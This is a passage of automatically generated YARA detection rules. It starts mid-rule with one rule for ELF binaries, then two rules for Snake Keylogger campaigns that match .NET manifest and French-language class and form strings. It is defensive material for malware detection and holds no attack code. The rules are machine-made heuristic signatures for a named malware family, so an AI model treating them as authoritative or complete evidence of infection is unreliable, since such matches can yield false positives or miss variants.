        hash = "074d7d9fa0a9111bdc15f1c6f88001a3f45c468e0ae7f67df9501b1ad1c70ec5"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-695aa8e5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s1 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s2 = "ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT" ascii
        $s3 = "((unsigned long) chunk2mem (brk) & MALLOC_ALIGN_MASK) == 0" ascii
        $s4 = "info[DT_RELAENT]->d_un.d_val == sizeof (ElfW(Rela))" ascii
        $s5 = "WARNING: ld.so: invalid GLIBC_TUNABLES `%s': ignored." ascii
        $s6 = "info[DT_RELRENT]->d_un.d_val == sizeof (ElfW(Relr))" ascii
        $s7 = "info[DT_RELENT]->d_un.d_val == sizeof (ElfW(Rel))" ascii
        $s8 = "version == NULL || !(flags & DL_LOOKUP_RETURN_NEWEST)" ascii
        $s9 = "(char *) chunk2mem (p) + 2 * CHUNK_HDR_SZ <= paligned_mem" ascii
        $s10 = "chunksize_nomask (p) == (0 | PREV_INUSE)" ascii
        $s11 = "robust || (oldval & FUTEX_OWNER_DIED) == 0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1195864 and 12 of them
}

rule Sightlines_tlsh_a40632e9_snakekeylogger
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a40632e9"
        date = "2026-10-15"
        campaign = "tlsh-a40632e9"
        family = "snakekeylogger"
        hash = "1a56264052af72a512ad3e6d9a1f5eae72f07be03109ea14dee0646afb77e3a2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a40632e9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s2 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s3 = ".NET Framework 4.5" ascii
        $s4 = "Segoe UI Semibold" wide
        $s5 = "btnReinitialiser" ascii
        $s6 = "btnExporterXml" ascii
        $s7 = "<Extract>b__3" ascii
        $s8 = "<Extract>b__5" ascii
        $s9 = "DateGeneration" wide
        $s10 = "btnAppliquer" ascii
        $s11 = "cheminXsd" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1720320 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_5201ba0c_snakekeylogger
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-5201ba0c"
        date = "2026-10-15"
        campaign = "dotnet_typelib_guid-5201ba0c"
        family = "snakekeylogger"
        hash = "66d3101e3b2207acdbdd9d0c14a1c3ea064e14a771705d8a4583faecaba98544"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-5201ba0c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s2 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s3 = "<NombrePoidsLourdsServis>k__BackingField" ascii
        $s4 = "BilanAireService_{0:yyyyMMdd_HHmmss}.xml" wide
        $s5 = "<VolumeCarburantVenduLitres>k__BackingField" ascii
        $s6 = "<MettreAJourStatistiquesOccupation>b__64_0" ascii
        $s7 = "<MettreAJourStatistiquesOccupation>b__64_1" ascii
        $s8 = "<LitresCarburantDemandes>k__BackingField" ascii
        $s9 = "<ChiffreAffairesCarburant>k__BackingField" ascii
        $s10 = "<PlacesPoidsLourdsOccupees>k__BackingField" ascii
        $s11 = "<DureeMoyenneSejourSecondes>k__BackingField" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1720320 and 12 of them
}
